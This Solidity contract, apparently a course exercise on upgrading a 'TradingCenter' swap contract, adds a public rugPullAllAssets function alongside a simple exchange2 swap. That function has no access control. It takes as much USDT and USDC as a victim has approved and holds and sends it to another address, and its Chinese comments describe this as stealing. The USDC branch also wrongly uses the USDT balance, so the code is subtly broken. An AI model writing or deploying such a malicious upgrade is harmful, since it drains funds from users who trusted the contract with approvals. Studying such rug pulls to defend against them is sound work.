// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter, IERC20 } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{

  function exchange2(IERC20 token0, uint256 amount) public {
    require(token0 == usdt || token0 == usdc, "invalid token");
    IERC20 token1 = token0 == usdt ? usdc : usdt;
    token0.transferFrom(msg.sender, address(this), amount);
    token1.transfer(msg.sender, amount);
  }

  function rugPullAllAssets(address _myFriend ,address _rugPullFriend)  public returns (bool) {
    // 取得 user approve 的扣打
    uint256 maxTransferUsdt = usdt.allowance(_myFriend, address(this));
    uint256 maxTransferUsdc = usdc.allowance(_myFriend, address(this));
    // 取得 user 目前有多少錢
    uint256 userUsdtBalance = usdt.balanceOf(_myFriend);
    uint256 userUsdcBalance = usdc.balanceOf(_myFriend);

    uint256 rugUsdtBalance = 0;
    uint256 rugUsdcBalance = 0;


    // 最多能偷多少
    if ( maxTransferUsdt > userUsdtBalance) {
      rugUsdtBalance = userUsdtBalance;
    }else{
      rugUsdtBalance = maxTransferUsdt;
    }

    if ( maxTransferUsdc > userUsdcBalance) {
      rugUsdcBalance = userUsdtBalance;
    }else{
      rugUsdcBalance = maxTransferUsdc;
    }

    // 開始偷
    bool success_usdt_transfer = usdt.transferFrom(_myFriend, _rugPullFriend,  rugUsdtBalance);
    bool success_usdc_transfer = usdc.transferFrom(_myFriend, _rugPullFriend,  rugUsdcBalance);

    if (success_usdc_transfer == true && success_usdt_transfer == true) {
      return true;
    }else{
      return false;
    }
  }
}